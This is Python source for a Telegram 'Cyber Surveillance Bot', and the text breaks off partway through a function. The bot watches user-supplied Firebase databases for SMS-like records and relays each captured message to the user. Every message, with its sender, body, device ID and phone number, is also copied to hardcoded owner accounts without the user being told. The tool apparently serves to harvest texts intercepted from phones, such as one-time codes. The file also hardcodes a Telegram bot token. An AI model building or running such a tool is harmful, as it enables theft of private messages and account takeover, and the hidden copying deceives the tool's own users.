import os
import requests
import json
import time
import threading
import hashlib
import html
import random
import sys
import speedtest
import psutil
from datetime import datetime, timezone
from sseclient import SSEClient

# ---------------- CONFIG ----------------
BOT_TOKEN = "8588283910:AAEt2xE87fs3AFqvrMeZkfBC1GEBhI4m1uI"

if not BOT_TOKEN or BOT_TOKEN.strip() == "":
    print("❌ BOT_TOKEN missing inside ra.py file!")
    raise SystemExit(1)

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
OWNER_IDS = [1451422178]
PRIMARY_ADMIN_ID = 1451422178
POLL_INTERVAL = 2
MAX_SSE_RETRIES = 5
# ---------------------------------------

OFFSET = None
running = True
firebase_urls = {}    # chat_id -> firebase_url
watcher_threads = {}  # chat_id -> thread
seen_hashes = {}      # chat_id -> set(hash)
approved_users = set(OWNER_IDS)
BOT_START_TIME = time.time()
SENSITIVE_KEYS = {}
firebase_cache = {}   # chat_id -> firebase snapshot
cache_time = {}       # chat_id -> last refresh timestamp
CACHE_REFRESH_SECONDS = 3600  # 1 hour
NETWORK_SPEED_CACHE = {"download": 0, "upload": 0, "ping": 0, "last_test": 0}

# ---------- HACKING STYLES ----------
HACKING_PREFIXES = [
    "🖥️ [SYSTEM]", "🔐 [SECURE]", "📡 [TRANSMIT]", "🔍 [SCAN]", 
    "⚠️ [ALERT]", "✅ [SUCCESS]", "❌ [FAILED]", "⚡ [LIVE]",
    "🌀 [CYBER]", "💾 [CACHE]", "🛡️ [SHIELD]", "📊 [DATA]",
    "🔓 [ACCESS]", "🔒 [LOCK]", "🌐 [NETWORK]", "📶 [SIGNAL]"
]

PROGRESS_BARS = [
    "▰▰▰▰▰▰▰▰▰▰",
    "▰▰▰▰▰▰▰▰▰▱",
    "▰▰▰▰▰▰▰▰▱▱",
    "▰▰▰▰▰▰▰▱▱▱",
    "▰▰▰▰▰▰▱▱▱▱",
    "▰▰▰▰▰▱▱▱▱▱",
    "▰▰▰▰▱▱▱▱▱▱",
    "▰▰▰▱▱▱▱▱▱▱",
    "▰▰▱▱▱▱▱▱▱▱",
    "▰▱▱▱▱▱▱▱▱▱",
    "▱▱▱▱▱▱▱▱▱▱"
]

ASCII_HACKING = [
    """
    ╔═══════════════════════════════╗
    ║    CYBER SURVEILLANCE BOT     ║
    ║    ──────────────────────     ║
    ║    STATUS: ONLINE             ║
    ║    ENCRYPTION: ENABLED        ║
    ╚═══════════════════════════════╝
    """,
    """
    ████████████████████████████████
    █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
    █░░██░░██░░██░░██░░██░░██░░██░░█
    █░░██░░██░░██░░██░░██░░██░░██░░█
    █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
    ████████████████████████████████
    """,
    """
    ┌──────────────────────────────┐
    │  [•] INITIALIZING SYSTEM     │
    │  [•] LOADING MODULES...      │
    │  [•] ESTABLISHING CONNECTION │
    │  [✓] SYSTEM READY            │
    └──────────────────────────────┘
    """
]

ERROR_ANIMATIONS = [
    "⚠️ ░░░░░░░░░░", "⚠️ █░░░░░░░░░", "⚠️ ██░░░░░░░░", "⚠️ ███░░░░░░░",
    "⚠️ ████░░░░░░", "⚠️ █████░░░░░", "⚠️ ██████░░░░", "⚠️ ███████░░░",
    "⚠️ ████████░░", "⚠️ █████████░", "⚠️ ██████████", "⚠️ ERROR!",
    "❌ ██████████", "❌ OPERATION FAILED"
]

# ---------- UTILITY FUNCTIONS ----------
def hacking_print(text, prefix=None, sound_emoji=False):
    """Print with hacking style"""
    if prefix is None:
        prefix = random.choice(HACKING_PREFIXES)
    
    if sound_emoji:
        sound = random.choice(["🔊", "🔈", "📢", "🎵", "🎶"])
        print(f"{prefix} {sound} {text}")
    else:
        print(f"{prefix} {text}")

def show_progress_bar(percentage, label="", width=20):
    """Show a visual progress bar"""
    filled = int(width * percentage / 100)
    empty = width - filled
    
    # Choose bar style based on percentage
    if percentage < 30:
        bar_char = "▱"
        filled_char = "▰"
        color = "🔴"
    elif percentage < 70:
        bar_char = "▱"
        filled_char = "▰"
        color = "🟡"
    else:
        bar_char = "▱"
        filled_char = "▰"
        color = "🟢"
    
    bar = f"{color} [{filled_char * filled}{bar_char * empty}] {percentage}%"
    if label:
        bar += f" - {label}"
    return bar

def animate_loading(text="Processing", duration=1.5):
    """Show loading animation"""
    frames = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        sys.stdout.write(f"\r{random.choice(HACKING_PREFIXES)} {frames[i]} {text}")
        sys.stdout.flush()
        time.sleep(0.1)
        i = (i + 1) % len(frames)
    sys.stdout.write(f"\r{random.choice(HACKING_PREFIXES)} ✅ {text} COMPLETE\n")
    sys.stdout.flush()

def show_error_animation(error_msg):
    """Display error with animation"""
    for frame in ERROR_ANIMATIONS:
        sys.stdout.write(f"\r{frame} {error_msg}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write(f"\n{random.choice(HACKING_PREFIXES)} ❌ {error_msg}\n")

def normalize_json_url(url):
    if not url:
        return None
    u = url.rstrip("/")
    if not u.endswith(".json"):
        u = u + "/.json"
    return u

def send_msg(chat_id, text, parse_mode="HTML", reply_markup=None):
    def _send_one(cid):
        try:
            # Add hacking style to messages
            prefix = random.choice(HACKING_PREFIXES)
            styled_text = f"{prefix}\n\n{text}"
            
            payload = {"chat_id": cid, "text": styled_text}
            if parse_mode:
                payload["parse_mode"] = parse_mode
            if reply_markup is not None:
                payload["reply_markup"] = reply_markup
            response = requests.post(f"{API_URL}/sendMessage", json=payload, timeout=10)
            
            # Log with style
            if response.status_code == 200:
                hacking_print(f"Message sent to {cid}", sound_emoji=random.choice([True, False]))
            else:
                show_error_animation(f"Failed to send to {cid}")
                
        except Exception as e:
            show_error_animation(f"send_msg -> failed to send to {cid}: {e}")

    if isinstance(chat_id, (list, tuple, set)):
        for cid in chat_id:
            _send_one(cid)
    else:
        _send_one(chat_id)

def get_updates():
    global OFFSET
    try:
        params = {"timeout": 20}
        if OFFSET:
            params["offset"] = OFFSET
        hacking_print("Fetching updates...", "📡 [SCANNING]")
        r = requests.get(f"{API_URL}/getUpdates", params=params, timeout=30).json()
        if r.get("result"):
            OFFSET = r["result"][-1]["update_id"] + 1
        return r.get("result", [])
    except Exception as e:
        show_error_animation(f"get_updates error: {e}")
        return []

def http_get_json(url):
    try:
        animate_loading(f"Connecting to {url[:30]}...")
        r = requests.get(url, timeout=12)
        r.raise_for_status()
        hacking_print(f"Connected successfully!", "🌐 [CONNECTED]", sound_emoji=True)
        return r.json()
    except Exception as e:
        show_error_animation(f"http_get_json error for {url[:30]}: {e}")
        return None

def format_notification(fields, user_id):
    device = html.escape(str(fields.get("device", "Unknown")))
    sender = html.escape(str(fields.get("sender", "Unknown")))
    message = html.escape(str(fields.get("message", "")))
    t = html.escape(str(fields.get("time", "")))
    
    # Add cyber security vibe
    text = (
        f"╔═══════════════════════════════╗\n"
        f"║ 🆕 CYBER ALERT: SMS DETECTED  ║\n"
        f"╠═══════════════════════════════╣\n"
        f"║ 📱 Device: <code>{device}</code>\n"
        f"║ 👤 From: <b>{sender}</b>\n"
        f"║ 💬 Message: {message}\n"
        f"║ 🕐 Time: {t}\n"
        f"║ 👤 Forward ID: <code>{user_id}</code>\n"
    )
    if fields.get("device_phone"):
        text += (
            f"║ 📞 Device Num: "
            f"<code>{html.escape(str(fields.get('device_phone')))}</code>\n"
        )
    text += "╚═══════════════════════════════╝"
    return text

# ---------- NETWORK SPEED TEST ----------
def test_network_speed(force=False):
    """Test network speed and cache results"""
    current_time = time.time()
    
    # Use cached results if less than 5 minutes old and not forced
    if not force and (current_time - NETWORK_SPEED_CACHE["last_test"] < 300):
        return NETWORK_SPEED_CACHE
    
    try:
        hacking_print("Testing network speed...", "📶 [SPEEDTEST]")
        animate_loading("Measuring download speed")
        
        st = speedtest.Speedtest()
        st.get_best_server()
        
        # Test download speed
        download_speed = st.download() / 1_000_000  # Convert to Mbps
        
        animate_loading("Measuring upload speed")
        upload_speed = st.upload() / 1_000_000  # Convert to Mbps
        
        ping = st.results.ping
        
        # Update cache
        NETWORK_SPEED_CACHE.update({
            "download": round(download_speed, 2),
            "upload": round(upload_speed, 2),
            "ping": round(ping, 2),
            "last_test": current_time
        })
        
        hacking_print(f"Speed test complete: {download_speed:.2f} Mbps down, {upload_speed:.2f} Mbps up", 
                     "✅ [SPEEDTEST]", sound_emoji=True)
        
        return NETWORK_SPEED_CACHE
        
    except Exception as e:
        show_error_animation(f"Speed test failed: {e}")
        # Return cached values if available
        if NETWORK_SPEED_CACHE["last_test"] > 0:
            return NETWORK_SPEED_CACHE
        return {"download": 0, "upload": 0, "ping": 0, "last_test": 0}

def get_system_stats():
    """Get system statistics"""
    try:
        # CPU usage
        cpu_percent = psutil.cpu_percent(interval=0.5)
        
        # Memory usage
        memory = psutil.virtual_memory()
        memory_percent = memory.percent
        memory_used = memory.used / (1024**3)  # Convert to GB
        memory_total = memory.total / (1024**3)  # Convert to GB
        
        # Disk usage
        disk = psutil.disk_usage('/')
        disk_percent = disk.percent
        disk_used = disk.used / (1024**3)  # Convert to GB
        disk_total = disk.total / (1024**3)  # Convert to GB
        
        # Network I/O (since bot start)
        net_io = psutil.net_io_counters()
        bytes_sent = net_io.bytes_sent / (1024**2)  # Convert to MB
        bytes_recv = net_io.bytes_recv / (1024**2)  # Convert to MB
        
        return {
            "cpu_percent": round(cpu_percent, 1),
            "memory_percent": round(memory_percent, 1),
            "memory_used": round(memory_used, 2),
            "memory_total": round(memory_total, 2),
            "disk_percent": round(disk_percent, 1),
            "disk_used": round(disk_used, 2),
            "disk_total": round(disk_total, 2),
            "bytes_sent": round(bytes_sent, 2),
            "bytes_recv": round(bytes_recv, 2),
            "thread_count": threading.active_count(),
            "process_count": len(psutil.pids())
        }
    except Exception as e:
        show_error_animation(f"System stats error: {e}")
        return None

# ---------- SSE WATCHER ----------
def sse_loop(chat_id, base_url):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    stream_url = url + "?print=silent"
    seen = seen_hashes.setdefault(chat_id, set())
    
    # Show connection animation
    for i in range(0, 101, 10):
        hacking_print(show_progress_bar(i, "Establishing SSE Connection", 10))
        time.sleep(0.2)
    
    send_msg(chat_id, "⚡ [LIVE STREAM] SSE connection established. Auto-reconnect enabled.")
    
    retries = 0
    while firebase_urls.get(chat_id) == base_url:
        try:
            hacking_print("Listening for real-time events...", "📡 [LISTENING]", sound_emoji=True)
            client = SSEClient(stream_url)
            for event in client.events():
                if firebase_urls.get(chat_id) != base_url:
                    break
                if not event.data or event.data == "null":
                    continue
                try:
                    data = json.loads(event.data)
                except Exception:
                    continue
                payload = (
                    data.get("data")
                    if isinstance(data, dict) and "data" in data
                    else data
                )
                nodes = find_sms_nodes(payload, "")
                for path, obj in nodes:
                    h = compute_hash(path, obj)
                    if h in seen:
                        continue
                    seen.add(h)
                    fields = extract_fields(obj)
                    notify_user_owner(chat_id, fields)
            retries = 0
        except Exception as e:
            show_error_animation(f"SSE error ({chat_id}): {e}")
            retries += 1
            if retries >= MAX_SSE_RETRIES:
                send_msg(
                    chat_id,
                    "⚠️ [FALLBACK] SSE failed, switching to polling mode...",
                )
                poll_loop(chat_id, base_url)
                break
            backoff = min(30, 2 ** retries)
            time.sleep(backoff)

# ---------- STARTUP ANIMATION ----------
def show_startup_animation():
    """Show cool startup animation"""
    print("\n" * 2)
    print(random.choice(ASCII_HACKING))
    time.sleep(0.5)
    
    hacking_print("Initializing Cyber Surveillance System...", "🖥️ [BOOT]")
    
    # Show progress bars for different systems
    systems = [
        ("Telegram API", 95),
        ("Firebase Monitor", 88),
        ("Encryption Layer", 92),
        ("SSE Stream", 78),
        ("Cache System", 85),
        ("Network Monitor", 90),
        ("Speed Test Engine", 82)
    ]
    
    for system_name, percent in systems:
        hacking_print(show_progress_bar(percent, system_name))
        time.sleep(0.3)
    
    hacking_print("All systems operational", "✅ [READY]", sound_emoji=True)
    print("\n" + "═" * 50 + "\n")

# ---------- ENHANCED PING COMMAND ----------
def handle_ping_command(chat_id):
    """Enhanced ping command with network speed and system stats"""
    uptime_sec = int(time.time() - BOT_START_TIME)
    uptime_str = format_uptime(uptime_sec)
    monitored_count = len(firebase_urls)
    approved_count = len(approved_users)
    
    # Calculate system health percentage
    health = min(95, 70 + (monitored_count * 5))
    
    # Get network speed
    speed_data = test_network_speed()
    
    # Get system stats
    system_stats = get_system_stats()
    
    # Base status for all users
    status_text = (
        f"{show_progress_bar(health, 'System Health')}\n\n"
        "╔═══════════════════════════════╗\n"
        "║       SYSTEM STATUS           ║\n"
        "╠═══════════════════════════════╣\n"
        f"║ 🏓 Status: <b>OPERATIONAL</b>      ║\n"
        f"║ ⏱ Uptime: <code>{uptime_str}</code>      ║\n"
        f"║ 📡 Monitors: <code>{monitored_count}</code>          ║\n"
        f"║ 👥 Users: <code>{approved_count}</code>            ║\n"
        "╚═══════════════════════════════╝\n"
    )
    
    # Add network speed section
    status_text += (
        "\n📶 <b>NETWORK SPEED</b>\n"
        "════════════════════════════════\n"
        f"⬇️ Download: <code>{speed_data['download']} Mbps</code>\n"
        f"⬆️ Upload: <code>{speed_data['upload']} Mbps</code>\n"
        f"🏓 Ping: <code>{speed_data['ping']} ms</code>\n"
    )
    
    # Add system stats if available
    if system_stats:
        status_text += (
            "\n💻 <b>SYSTEM RESOURCES</b>\n"
            "════════════════════════════════\n"
            f"🧠 CPU: <code>{system_stats['cpu_percent']}%</code>\n"
            f"💾 RAM: <code>{system_stats['memory_percent']}%</code> "
            f"(<code>{system_stats['memory_used']}/{system_stats['memory_total']} GB</code>)\n"
            f"💿 Disk: <code>{system_stats['disk_percent']}%</code>\n"
            f"📊 Threads: <code>{system_stats['thread_count']}</code>\n"
            f"🔄 Network I/O: "
            f"⬆️<code>{system_stats['bytes_sent']} MB</code>/"
            f"⬇️<code>{system_stats['bytes_recv']} MB</code>\n"
        )
    
    # Add admin-only section if user is admin
    if is_owner(chat_id):
        status_text += (
            "\n👑 <b>ADMIN DETAILS</b>\n"
            "════════════════════════════════\n"
        )
        
        # Active monitors details
        if firebase_urls:
            status_text += "📡 <b>ACTIVE MONITORS:</b>\n"
            for uid, url in list(firebase_urls.items())[:5]:  # Show first 5
                user_name = f"User_{uid}"
                status_text += f"• <code>{uid}</code> → {url[:40]}...\n"
            if len(firebase_urls) > 5:
                status_text += f"• ... and {len(firebase_urls) - 5} more\n"
        else:
            status_text += "📡 No active monitors\n"
        
        # Cache status
        active_caches = len(firebase_cache)
        status_text += f"\n💾 <b>CACHE STATUS:</b>\n"
        status_text += f"• Active caches: <code>{active_caches}</code>\n"
        status_text += f"• Cache refresh: <code>{CACHE_REFRESH_SECONDS//3600}h</code> interval\n"
        
        # Bot performance
        avg_response = 0.5  # Placeholder
        status_text += f"\n⚡ <b>PERFORMANCE:</b>\n"
        status_text += f"• Avg response: <code>{avg_response}s</code>\n"
        status_text += f"• Last speed test: <code>{format_uptime(int(time.time() - speed_data['last_test']))} ago</code>\n"
        
        # Bot recommendations
        if system_stats and system_stats['cpu_percent'] > 80:
            status_text += "\n⚠️ <b>RECOMMENDATION:</b> High CPU usage detected\n"
        elif system_stats and system_stats['memory_percent'] > 85:
            status_text += "\n⚠️ <b>RECOMMENDATION:</b> High RAM usage detected\n"
    
    # Add footer
    status_text += f"\n🔊 {random.choice(['All frequencies clear', 'Signal strong', 'Network stable'])}"
    
    send_msg(chat_id, status_text)

# ---------- REFRESH COMMAND ----------
def handle_refresh_command(chat_id):
    """Handle manual cache refresh command"""
    if chat_id not in firebase_urls:
        send_msg(chat_id, "❌ You don't have any active Firebase URL to refresh.")
        return
    
    animate_loading("Refreshing Firebase cache")
    
    base_url = firebase_urls.get(chat_id)
    json_url = normalize_json_url(base_url)
    
    if not json_url:
        send_msg(chat_id, "❌ Invalid Firebase URL.")
        return
    
    # Fetch fresh data
    snap = http_get_json(json_url)
    if snap is None:
        send_msg(chat_id, "❌ Failed to fetch data from Firebase. Check your URL.")
        return
    
    # Update cache
    firebase_cache[chat_id] = snap
    cache_time[chat_id] = time.time()
    
    # Count new SMS nodes
    old_count = len(seen_hashes.get(chat_id, set()))
    new_nodes = find_sms_nodes(snap, "")
    new_hashes = {compute_hash(p, o) for p, o in new_nodes}
    
    # Update seen hashes
    seen = seen_hashes.setdefault(chat_id, set())
    seen.update(new_hashes)
    
    # Send results
    refresh_msg = (
        "✅ <b>CACHE REFRESHED SUCCESSFULLY</b>\n\n"
        f"📊 <b>Statistics:</b>\n"
        f"• Total SMS nodes: <code>{len(new_nodes)}</code>\n"
        f"• Unique messages: <code>{len(new_hashes)}</code>\n"
        f"• Total tracked: <code>{len(seen)}</code>\n"
        f"• Cache time: <code>{datetime.now().strftime('%I:%M:%S %p')}</code>\n\n"
        f"🔄 Next auto-refresh: <code>{CACHE_REFRESH_SECONDS//3600} hours</code>\n"
        f"📡 URL: <code>{base_url[:50]}...</code>"
    )
    
    send_msg(chat_id, refresh_msg)
    
    # Notify owner if not owner
    if not is_owner(chat_id):
        send_msg(OWNER_IDS, 
                f"🔄 User <code>{chat_id}</code> manually refreshed their Firebase cache.")

# ---------- MODIFIED MAIN LOOP ----------
def main_loop():
    # Show startup animation
    show_startup_animation()
    
    send_msg(OWNER_IDS, "🚀 CYBER SURVEILLANCE BOT ACTIVATED\n\n"
                       "All systems online and monitoring.\n\n"
                       "✅ New features:\n"
                       "• /refresh - Manual cache refresh\n"
                       "• Enhanced /ping with network speed\n"
                       "• Admin-only detailed system stats")
    
    hacking_print("Bot started and running. Listening for messages...", 
                  "🚀 [ACTIVE]", sound_emoji=True)
    
    global running
    while running:
        updates = get_updates()
        for u in updates:
            try:
                handle_update(u)
            except Exception as e:
                show_error_animation(f"handle_update error: {e}")
        time.sleep(0.5)

# ---------- MODIFIED HANDLE_UPDATE ----------
def handle_update(u):
    msg = u.get("message") or {}
    chat = msg.get("chat", {}) or {}
    chat_id = chat.get("id")
    text = (msg.get("text") or "").strip()

    if not chat_id or not text:
        return

    # Reply-based /find shortcut
    if text.lower() == "/find" and msg.get("reply_to_message"):
        animate_loading("Analyzing reply message")
        reply = msg.get("reply_to_message")
        for line in (reply.get("text") or "").splitlines():
            if "Device:" in line:
                text = "/find " + line.split("Device:", 1)[1].strip()
                break

    lower_text = text.lower()

    # FIRST: approval check
    if not is_approved(chat_id):
        handle_not_approved(chat_id, msg)
        return

    # /start
    if lower_text == "/start":
        animate_loading("Loading interface")
        send_msg(
            chat_id,
            (
                "╔═══════════════════════════════╗\n"
                "║     CYBER SURVEILLANCE BOT    ║\n"
                "╠═══════════════════════════════╣\n"
                "║ 👋 ACCESS GRANTED             ║\n"
                "║                               ║\n"
                "║ 🔐 User: APPROVED             ║\n"
                "║ 📡 Status: ACTIVE             ║\n"
                "╚═══════════════════════════════╝\n\n"
                "📋 <b>AVAILABLE COMMANDS:</b>\n"
                "════════════════════════════════\n"
                "• /start - Show this message\n"
                "• /stop - Stop monitoring\n"
                "• /list - Show your Firebase URL\n"
                "• /find <device_id> - Search device\n"
                "• /ping - Enhanced system status\n"
                "• /refresh - Manually refresh cache\n\n"
                "👑 <b>ADMIN COMMANDS:</b>\n"
                "════════════════════════════════\n"
                "• /adminlist - Show all URLs\n"
                "• /approve <user_id>\n"
                "• /unapprove <user_id>\n"
                "• /approvedlist"
            ),
        )
        return

    # /ping - enhanced bot status
    if lower_text == "/ping":
        handle_ping_command(chat_id)
        return

    # /refresh - manual cache refresh
    if lower_text == "/refresh":
        handle_refresh_command(chat_id)
        return

    # /stop
    if lower_text == "/stop":
        animate_loading("Terminating monitor")
        stop_watcher(chat_id)
        send_msg(chat_id, "🛑 [TERMINATED] Monitoring stopped.")
        return

    # USER VIEW: /list
    if lower_text == "/list":
        user_url = firebase_urls.get(chat_id)
        if is_owner(chat_id):
            if not firebase_urls:
                send_msg(chat_id, "👑 No active Firebase monitoring right now.")
            else:
                send_msg(
                    chat_id,
                    (
                        "👑 You are an owner.\n"
                        "Use <b>/adminlist</b> to see all users' Firebase URLs.\n\n"
                        f"Your own Firebase: {user_url if user_url else 'None'}\n\n"
                        f"💾 Cache status: {'Fresh' if chat_id in cache_time and time.time() - cache_time[chat_id] < 1800 else 'Stale'}"
                    ),
                )
        else:
            if user_url:
                send_msg(
                    chat_id,
                    f"🔐 Your active Firebase:\n<code>{user_url}</code>\n\n"
                    f"💾 Cache: Last refreshed {format_uptime(int(time.time() - cache_time.get(chat_id, 0)))} ago\n"
                    f"🔄 Use /refresh to update manually"
                )
            else:
                send_msg(
                    chat_id,
                    "ℹ️ You don't have any active Firebase monitoring yet."
                )
        return

    # ADMIN VIEW: /adminlist
    if lower_text == "/adminlist":
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ This command is only for bot owners.")
            return
        if not firebase_urls:
            send_msg(chat_id, "👑 No active Firebase monitoring right now.")
            return
        lines = []
        for uid, url in firebase_urls.items():
            cache_status = "🟢" if uid in cache_time and time.time() - cache_time[uid] < 1800 else "🟡"
            lines.append(
                f"{cache_status} <code>{uid}</code> → <code>{html.escape(str(url))}</code>"
            )
        send_msg(
            chat_id,
            "👑 <b>ALL ACTIVE FIREBASE URLS (ADMIN ONLY)</b>:\n\n" + "\n".join(lines) +
            f"\n\n💾 <b>Cache Legend:</b>\n🟢 Fresh (<30min)\n🟡 Stale (>30min)\n🔴 Never cached"
        )
        return

    # -------- Owner-only approval commands --------
    if lower_text.startswith("/approve"):
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can approve users.")
            return
        parts = text.split()
        if len(parts) < 2:
            send_msg(chat_id, "Usage: <code>/approve user_id</code>")
            return
        try:
            target_id = int(parts[1])
        except ValueError:
            send_msg(chat_id, "❌ Invalid user ID.")
            return
        approved_users.add(target_id)
        send_msg(chat_id, f"✅ User <code>{target_id}</code> approved.")
        send_msg(target_id, "✅ You have been approved to use this bot.")
        return

    if lower_text.startswith("/unapprove"):
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can unapprove users.")
            return
        parts = text.split()
        if len(parts) < 2:
            send_msg(chat_id, "Usage: <code>/unapprove user_id</code>")
            return
        try:
            target_id = int(parts[1])
        except ValueError:
            send_msg(chat_id, "❌ Invalid user ID.")
            return
        if target_id in OWNER_IDS:
            send_msg(chat_id, "❌ Cannot unapprove an owner.")
            return
        if target_id in approved_users:
            approved_users.remove(target_id)
            send_msg(chat_id, f"🚫 User <code>{target_id}</code> unapproved.")
        else:
            send_msg(chat_id, f"ℹ️ User <code>{target_id}</code> was not approved.")
        return

    if lower_text == "/approvedlist":
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can see approved list.")
            return
        if not approved_users:
            send_msg(chat_id, "No approved users yet.")
            return
        lines = []
        for uid in sorted(approved_users):
            tag = " (owner)" if uid in OWNER_IDS else ""
            lines.append(f"👤 <code>{uid}</code>{tag}")
        send_msg(
            chat_id,
            "✅ <b>Approved users</b>:\n\n" + "\n".join(lines),
        )
        return

    # -------- /find <device_id> (safe) --------
    if lower_text.startswith("/find"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            send_msg(chat_id, "Usage: <code>/find device_id</code>")
            return
        device_id = parts[1].strip()
        base_url = firebase_urls.get(chat_id)
        if not base_url:
            send_msg(
                chat_id,
                "❌ You don't have any active Firebase URL.\n"
                "First send your Firebase RTDB URL to start monitoring.",
            )
            return
        json_url = normalize_json_url(base_url)
        snap = http_get_json(json_url)
        if snap is None:
            send_msg(chat_id, "❌ Failed to fetch data from your Firebase.")
            return
        matches = search_records_by_device(snap, device_id)
        if not matches:
            send_msg(chat_id, "🔍 No record found for this device id.")
            return
        max_show = 3
        for rec in matches[:max_show]:
            send_msg(chat_id, safe_format_device_record(rec))
        if len(matches) > max_show:
            send_msg(
                chat_id,
                f"ℹ️ {len(matches)} records matched, "
                f"showing first {max_show} only.",
            )
        return

    # -------- Firebase URL handling --------
    if text.startswith("http"):
        test_url = normalize_json_url(text)
        if not http_get_json(test_url):
            send_msg(
                chat_id,
                "❌ Unable to fetch URL. Make sure it's public and ends with .json",
            )
            return
        start_watcher(chat_id, text)
        send_msg(
            OWNER_IDS,
            f"👤 User <code>{chat_id}</code> started monitoring:\n"
            f"<code>{html.escape(text)}</code>",
        )
        return

    # Fallback help
    send_msg(
        chat_id,
        (
            "Send a Firebase RTDB URL to start monitoring.\n\n"
            "📋 <b>User Commands:</b>\n"
            "• /start - instructions\n"
            "• /stop - stop monitoring\n"
            "• /list - show your Firebase\n"
            "• /find <device_id> - search device\n"
            "• /ping - enhanced system status\n"
            "• /refresh - manually refresh cache\n\n"
            "👑 <b>Admin Commands:</b>\n"
            "• /adminlist - show all URLs\n"
            "• /approve <user_id>\n"
            "• /unapprove <user_id>\n"
            "• /approvedlist"
        ),
    )

# ---------- KEEP ALL YOUR EXISTING FUNCTIONS ----------
# (Keeping all other functions same as before, only adding the extract_fields function for completeness)

def is_sms_like(obj):
    if not isinstance(obj, dict):
        return False
    keys = {k.lower() for k in obj.keys()}
    score = 0
    if keys & {"message", "msg", "body", "text", "sms"}:
        score += 2
    if keys & {"from", "sender", "address", "source", "number"}:
        score += 2
    if keys & {"time", "timestamp", "ts", "date", "created_at"}:
        score += 1
    if keys & {"device", "deviceid", "imei", "device_id", "phoneid"}:
        score += 1
    return score >= 3

def find_sms_nodes(snapshot, path=""):
    found = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else k
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    return found

def extract_fields(obj):
    device = (
        obj.get("device")
        or obj.get("deviceId")
        or obj.get("device_id")
        or obj.get("imei")
        or obj.get("id")
        or "Unknown"
    )
    sender = (
        obj.get("from")
        or obj.get("sender")
        or obj.get("address")
        or obj.get("number")
        or "Unknown"
    )
    message = (
        obj.get("message")
        or obj.get("msg")
        or obj.get("body")
        or obj.get("text")
        or ""
    )
    ts = (
        obj.get("time")
        or obj.get("timestamp")
        or obj.get("date")
        or obj.get("created_at")
        or None
    )
    if isinstance(ts, (int, float)):
        try:
            ts = (
                datetime.fromtimestamp(float(ts), tz=timezone.utc)
                .astimezone()
                .strftime("%d/%m/%Y, %I:%M:%S %p")
            )
        except Exception:
            ts = str(ts)
    elif isinstance(ts, str):
        digits = "".join(ch for ch in ts if ch.isdigit())
        if len(digits) == 10:
            try:
                ts = (
                    datetime.fromtimestamp(int(digits), tz=timezone.utc)
                    .astimezone()
                    .strftime("%d/%m/%Y, %I:%M:%S %p")
                )
            except Exception:
                pass
    if not ts:
        ts = datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")
    device_phone = (
        obj.get("phone") or obj.get("mobile") or obj.get("MobileNumber") or None
    )
    return {
        "device": device,
        "sender": sender,
        "message": message,
        "time": ts,
        "device_phone": device_phone,
    }

def compute_hash(path, obj):
    try:
        return hashlib.sha1(
            (path + json.dumps(obj, sort_keys=True, default=str)).encode()
        ).hexdigest()
    except Exception:
        return hashlib.sha1((path + str(obj)).encode()).hexdigest()

def notify_user_owner(chat_id, fields):
    text = format_notification(fields, chat_id)
    send_msg(chat_id, text)
    send_msg(OWNER_IDS, text)

def poll_loop(chat_id, base_url):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    seen = seen_hashes.setdefault(chat_id, set())
    send_msg(chat_id, f"📡 [POLLING] Started (interval: {POLL_INTERVAL}s).")
    while firebase_urls.get(chat_id) == base_url:
        snap = http_get_json(url)
        if not snap:
            time.sleep(POLL_INTERVAL)
            continue
        nodes = find_sms_nodes(snap, "")
        for path, obj in nodes:
            h = compute_hash(path, obj)
            if h in seen:
                continue
            seen.add(h)
            fields = extract_fields(obj)
            notify_user_owner(chat_id, fields)
        time.sleep(POLL_INTERVAL)
    send_msg(chat_id, "⛔ [STOPPED] Polling terminated.")

def start_watcher(chat_id, base_url):
    firebase_urls[chat_id] = base_url
    seen_hashes[chat_id] = set()
    json_url = normalize_json_url(base_url)
    
    # Show initialization animation
    for i in range(0, 101, 20):
        hacking_print(show_progress_bar(i, "Initializing monitor"))
        time.sleep(0.2)
    
    snap = http_get_json(json_url)
    if snap:
        for p, o in find_sms_nodes(snap, ""):
            seen_hashes[chat_id].add(compute_hash(p, o))
    t = threading.Thread(target=sse_loop, args=(chat_id, base_url), daemon=True)
    watcher_threads[chat_id] = t
    t.start()
    send_msg(chat_id, "✅ [ACTIVE] Monitoring initialized. Alerts enabled.")
    refresh_firebase_cache(chat_id)

def stop_watcher(chat_id):
    firebase_urls.pop(chat_id, None)
    seen_hashes.pop(chat_id, None)
    watcher_threads.pop(chat_id, None)
    send_msg(chat_id, "🛑 [TERMINATED] Monitoring stopped.")

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

def is_approved(user_id: int) -> bool:
    return user_id in approved_users or is_owner(user_id)

def handle_not_approved(chat_id, msg):
    from_user = msg.get("from", {}) or {}
    first_name = from_user.get("first_name", "")
    username = from_user.get("username", None)
    reply_markup = {
        "inline_keyboard": [
            [
                {
                    "text": "📨 Contact Admin",
                    "url": f"tg://user?id={PRIMARY_ADMIN_ID}",
                }
            ]
        ]
    }
    user_info_lines = [
        "╔═══════════════════════════════╗",
        "║     ACCESS DENIED             ║",
        "╠═══════════════════════════════╣",
        "║ ❌ UNAUTHORIZED ACCESS        ║",
        "║                               ║",
        "║ Tap below to request access   ║",
